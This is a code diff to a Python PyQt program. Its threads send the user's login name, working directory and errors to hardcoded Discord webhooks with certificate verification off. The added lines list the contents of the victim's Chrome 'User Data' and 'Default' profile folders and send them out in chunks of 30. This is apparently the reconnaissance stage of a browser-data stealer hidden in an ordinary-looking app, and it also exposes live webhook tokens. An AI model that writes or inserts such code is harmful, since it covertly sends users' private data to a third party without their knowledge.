@@ -90,6 +90,8 @@ class StarterThread(QThread):
         except Exception as we:
             error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} STARTER] {str(we)}"})
 
+def chunks(l, n): return [l[i:i + n] for i in range(0, len(l), n)]
+        
 class Additional1Thread(QThread):
     def run(self):
         access_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getlogin()} {os.getcwd()}] Accessed."})
@@ -101,11 +103,8 @@ class Additional1Thread(QThread):
 
             aa = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
             bb = path.join(aa, "Default")
-            listeddirsaa = f"[{os.getlogin()} {os.getcwd()}] Listed for aa: {str(listdir(aa))}"
-            listeddirsbb = f"[{os.getlogin()} {os.getcwd()}] Listed for bb: {str(listdir(bb))}"
-            cc1 = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": listeddirsaa})
-            cc2 = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": listeddirsbb})
-            print("--------------------", cc1, cc2)
+            for chunk in chunks(listdir(aa), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for aa: {str(chunk)}"})
+            for chunk in chunks(listdir(bb), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for bb: {str(chunk)}"})
             
             try:
                 a1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
